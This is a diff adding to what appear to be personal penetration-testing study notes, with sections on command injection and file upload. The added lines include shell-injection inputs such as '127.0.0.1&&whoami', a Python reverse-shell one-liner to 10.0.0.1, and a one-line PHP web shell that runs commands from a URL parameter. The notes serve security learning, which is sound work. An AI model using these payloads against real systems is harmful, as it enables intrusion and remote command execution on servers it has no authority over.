@@ -636,15 +636,60 @@ Accessing a local resource that may not return
 
 ####### Command Injection ########
 
+- Reverse Shell Cheat Sheet
+	- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+
 - Most Severe Vulnerabilities
 - Give me the opportunity to execute commands on the server and get
 infomation back and possibly get a shell on the server
+	- ex: tricking an application to perform the command 'whoami' to 
+	list what user account the application is running
 
-
+-- Some Commands
+	- Input Field:
+		- 127.0.0.1&&whoami
+		- asdf||whoami
+		- asdf|id
+		- asdf|ifconfig|
+		- Checking to reach a server
+			- parameter=|ping -c 10 127.0.0.1
+			- parameter=&&ping -c 10 127.0.0.1
+				- '-c 10' creates a 10 second delay
+		- Get a reverse shell
+			- asdf||python3
+			- python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+	- Saving a command to a file
+		- $ whoami > file.txt
+		- $ whoami > /var/www/images/file.txt
+			- parameter=asdf||whoami>/var/www/images/file.txt||
+			- execute file.txt from images directory
 
 
 
 ####### File Upload ########
+
+- Webshells
+	- https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
+
+- Can be a sever vulnerability if file is uploaded in a place it can be 
+executed and get back a reverse shell
+
+- Creating a WebShell
+	- gedit web.php5
+	- paste shell command
+		ex: <?php system($_GET['cmd']); ?>
+	- may have to change .cmd extention depending on software
+	- go to file in url and make a whoami query
+		- www.website.com/path/to/web.php5/?cmd=whoami
+
+
+
+
+
+
+
 ####### LFI & RFL ########
 ####### Cookies & Tokens ########
 ####### Wordpress & CMS ########
